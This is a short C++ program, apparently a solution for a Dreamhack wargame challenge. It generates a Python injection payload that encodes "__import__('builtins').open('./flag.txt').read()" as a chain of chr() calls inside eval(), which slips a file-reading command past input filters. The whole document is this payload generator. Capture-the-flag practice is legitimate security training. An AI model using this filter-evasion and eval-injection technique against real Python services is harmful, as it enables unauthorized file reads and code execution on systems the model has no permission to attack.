//Wargame site URL: https://dreamhack.io/wargame/challenges/1021

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <iostream>
#include <string.h>

using namespace std;
using ll = long long;

int main(void) {
	char c[1010] = "__import__('builtins').open('./flag.txt').read()";

	printf("eval(");
	for (int i = 0; i < strlen(c); i++) {
		printf("chr(%d)", c[i]);
		if (i < strlen(c) - 1)printf("+");
	}
	printf(")");
	return 0;
}
